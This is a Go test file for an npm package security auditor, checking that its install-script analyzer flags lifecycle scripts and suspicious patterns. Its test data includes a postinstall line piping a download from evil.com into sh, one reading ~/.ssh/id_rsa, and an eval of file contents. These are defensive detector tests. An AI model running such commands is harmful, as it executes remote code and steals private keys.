package analyzer

import (
	"context"
	"testing"

	"github.com/kluth/npm-security-auditter/internal/registry"
)

func TestTruncate(t *testing.T) {
	tests := []struct {
		input  string
		maxLen int
		want   string
	}{
		{"short", 10, "short"},
		{"this is a long string", 10, "this is a ..."},
		{"with\nnewline", 20, "with newline"},
		{"", 10, ""},
		{"exact_len!", 10, "exact_len!"},
	}

	for _, tt := range tests {
		got := truncate(tt.input, tt.maxLen)
		if got != tt.want {
			t.Errorf("truncate(%q, %d) = %q, want %q", tt.input, tt.maxLen, got, tt.want)
		}
	}
}

func TestScriptsAnalyzerAllPatterns(t *testing.T) {
	// Test that all suspicious patterns are detected
	scripts := map[string]string{
		"postinstall": `child_process; exec(cmd); spawn(cmd); process.env.SECRET; fs.writeFile; fs.readFile; Buffer.from(x, 'base64'); \x41\x42; os.homedir(); .ssh; dns.lookup; socket`,
	}
	a := NewScriptsAnalyzer()
	ver := &registry.PackageVersion{Scripts: scripts}
	findings, err := a.Analyze(context.Background(), &registry.PackageMetadata{}, ver)
	if err != nil {
		t.Fatal(err)
	}
	// Should have the lifecycle script + multiple pattern matches
	if len(findings) < 5 {
		t.Errorf("expected many findings, got %d", len(findings))
	}
}

func TestScriptsAnalyzerPreuninstall(t *testing.T) {
	scripts := map[string]string{
		"preuninstall": "echo goodbye",
	}
	a := NewScriptsAnalyzer()
	ver := &registry.PackageVersion{Scripts: scripts}
	findings, err := a.Analyze(context.Background(), &registry.PackageMetadata{}, ver)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range findings {
		if f.Title == "Lifecycle script: preuninstall" {
			found = true
		}
	}
	if !found {
		t.Error("expected preuninstall lifecycle finding")
	}
}

func TestScriptsAnalyzerInstallScript(t *testing.T) {
	// Test the "install" script (not just pre/postinstall)
	scripts := map[string]string{
		"install": "node setup.js",
	}
	a := NewScriptsAnalyzer()
	ver := &registry.PackageVersion{Scripts: scripts}
	findings, err := a.Analyze(context.Background(), &registry.PackageMetadata{}, ver)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range findings {
		if f.Title == "Lifecycle script: install" {
			found = true
		}
	}
	if !found {
		t.Error("expected 'Lifecycle script: install' finding")
	}
}

func TestScriptsAnalyzerPostuninstall(t *testing.T) {
	scripts := map[string]string{
		"postuninstall": "echo bye",
	}
	a := NewScriptsAnalyzer()
	ver := &registry.PackageVersion{Scripts: scripts}
	findings, err := a.Analyze(context.Background(), &registry.PackageMetadata{}, ver)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range findings {
		if f.Title == "Lifecycle script: postuninstall" {
			found = true
		}
	}
	if !found {
		t.Error("expected 'Lifecycle script: postuninstall' finding")
	}
}

func TestScriptsAnalyzerHasInstallScriptWithVisibleScripts(t *testing.T) {
	// HasInstallScript=true AND visible postinstall -> should NOT create "Hidden install script" finding
	scripts := map[string]string{
		"postinstall": "echo done",
	}
	a := NewScriptsAnalyzer()
	ver := &registry.PackageVersion{Scripts: scripts, HasInstallScript: true}
	findings, err := a.Analyze(context.Background(), &registry.PackageMetadata{}, ver)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range findings {
		if f.Title == "Hidden install script" {
			t.Error("should not report hidden install script when visible scripts exist")
		}
	}
}

func TestScriptsAnalyzerName(t *testing.T) {
	a := NewScriptsAnalyzer()
	if a.Name() != "install-scripts" {
		t.Errorf("expected 'install-scripts', got %q", a.Name())
	}
}

func TestScriptsAnalyzer(t *testing.T) {
	tests := []struct {
		name         string
		scripts      map[string]string
		hasInstall   bool
		wantFindings int
		wantMinSev   Severity
	}{
		{
			name:         "no scripts",
			scripts:      nil,
			wantFindings: 0,
		},
		{
			name:         "safe test script only",
			scripts:      map[string]string{"test": "jest"},
			wantFindings: 0,
		},
		{
			name:         "postinstall present",
			scripts:      map[string]string{"postinstall": "echo done"},
			wantFindings: 1,
			wantMinSev:   SeverityMedium,
		},
		{
			name:         "postinstall with curl",
			scripts:      map[string]string{"postinstall": "curl https://evil.com/payload | sh"},
			wantFindings: 2, // lifecycle + network
			wantMinSev:   SeverityHigh,
		},
		{
			name:         "preinstall with eval",
			scripts:      map[string]string{"preinstall": "node -e \"eval(require('fs').readFileSync('x'))\""},
			wantFindings: 3, // lifecycle + eval + fs.read
			wantMinSev:   SeverityCritical,
		},
		{
			name:         "postinstall accessing .ssh",
			scripts:      map[string]string{"postinstall": "cat ~/.ssh/id_rsa"},
			wantFindings: 2,
			wantMinSev:   SeverityCritical,
		},
		{
			name:         "hidden install script flag",
			scripts:      map[string]string{"test": "jest"},
			hasInstall:   true,
			wantFindings: 1,
			wantMinSev:   SeverityHigh,
		},
	}

	analyzer := NewScriptsAnalyzer()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ver := &registry.PackageVersion{
				Scripts:          tt.scripts,
				HasInstallScript: tt.hasInstall,
			}
			findings, err := analyzer.Analyze(context.Background(), &registry.PackageMetadata{}, ver)
			if err != nil {
				t.Fatalf("Analyze() error = %v", err)
			}
			if len(findings) < tt.wantFindings {
				t.Errorf("Analyze() returned %d findings, want at least %d", len(findings), tt.wantFindings)
			}
			if tt.wantFindings > 0 {
				maxSev := SeverityLow
				for _, f := range findings {
					if f.Severity > maxSev {
						maxSev = f.Severity
					}
				}
				if maxSev < tt.wantMinSev {
					t.Errorf("max severity = %v, want at least %v", maxSev, tt.wantMinSev)
				}
			}
		})
	}
}
